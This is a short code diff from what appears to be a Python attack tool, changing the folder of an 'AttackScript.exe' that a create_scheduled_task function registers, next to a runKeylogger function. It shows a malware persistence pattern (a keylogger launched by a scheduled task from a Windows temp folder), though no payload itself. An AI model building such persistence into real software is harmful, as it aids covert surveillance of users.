@@ -317,7 +317,7 @@ def runKeylogger():
     check_call([executable_path])
 
 def create_scheduled_task():
-    executable_file_path = r'C:\\Windows\\temp\\Smartmeter\\AttackScript.exe' #Help me change this
+    executable_file_path = r'C:\\Windows\\temp\\Smartmetertest\\AttackScript.exe' #Help me change this
 
     executable_file_parameters = '1'
 
